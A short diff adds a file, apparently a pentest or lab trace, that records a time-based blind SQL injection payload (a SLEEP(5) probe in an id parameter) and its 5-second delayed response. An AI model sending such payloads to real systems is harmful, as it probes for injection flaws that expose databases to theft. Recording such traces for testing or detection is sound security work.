@@ -1,0 +1,6 @@
+Time-Based Blind 흔적
+
+GET /item?id=1' AND IF(1=1,SLEEP(5),0)--
+상태코드: 200
+response_time: 5.02초
+응답 본문: 정상
